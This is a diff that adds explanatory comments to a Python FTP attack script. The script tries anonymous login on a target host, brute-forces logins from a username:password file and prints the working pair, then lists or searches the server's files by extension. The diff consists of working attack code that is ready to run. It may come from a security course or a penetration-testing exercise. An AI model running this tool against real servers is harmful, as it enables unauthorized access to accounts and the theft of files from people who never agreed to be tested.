@@ -2,29 +2,37 @@ import ftplib
 import time
 from os import truncate
 
-
+# Method tries to log into a targeted ftpserver using anonymous credentials
 def anonymousLogin(targetHostname):
     try:
+        # Makes a connection to the ftp server
         ftp = ftplib.FTP(targetHostname)
+        # tries to login with default anonymous login credentails
         ftp.login('anonymous', 'anonymous')
+        # Displays either success or failure message
         print("\n[*] "+str(targetHostname) +" FTP Anonymous login successful")
         ftp.quit()
         return True
     except Exception :
         print("\n[ - ] "+str(targetHostname)+" FTP anonymous login failed")
         return False
-    
+
+# Method tries to brutefoce login using user supplied list of credentials
 def forceLogin(targetHostname, credentialsFile):
+    # Reads in credentials from the user specified file
     creds = open(credentialsFile, 'r')
     for line in creds.readlines():
         time.sleep(1)
+        # strips the input from the file into username and password, credentails should be stored in <username>:<password> format
         username = line.split(':')[0]
         password = line.split(':')[1].strip('\r').strip('\n')
         print("[+] Trying: "+username + " : "+password)
         
         try:
+            # attempts to make a ftp connection using supplied credentials
             ftp = ftplib.FTP(targetHostname)
             ftp.login(username, password)
+            # displays to user credentails that were able to make a successful connection
             print("\n[*] "+str(targetHostname)+" FTP login successful...  "+username+":"+password)
             ftp.quit()
             return(username, password)
@@ -33,6 +41,7 @@ def forceLogin(targetHostname, credentialsFile):
     print("\n[ - ] Unable to bruteforce any FTP login credentials from given list")
     return(None, None)
 
+# Method prints out all of the contents of the ftp or searches for spefic files extentions and prints only those 
 def displayContents(ftpconnection, extentions):
     try:
         directoryList = ftpconnection.nlst()
